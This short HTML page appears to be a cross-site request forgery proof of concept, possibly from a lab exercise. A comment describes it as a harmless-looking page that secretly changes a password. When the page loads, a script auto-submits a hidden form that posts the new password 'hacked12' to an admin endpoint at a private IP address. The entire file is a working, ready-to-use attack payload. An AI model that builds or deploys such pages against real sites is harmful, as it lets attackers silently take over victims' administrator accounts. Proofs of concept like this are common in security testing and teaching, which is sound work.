<!doctype html>
<html>
    <body>
        <!-- // A seemingly harmless page that secretly triggers a password change request -->
        <form id="f" action="https://192.168.1.35/admins/csrf" method="post">
            <input type="hidden" name="password" value="hacked12" />
        </form>
        <script>
            document.getElementById("f").submit();
        </script>
    </body>
</html>
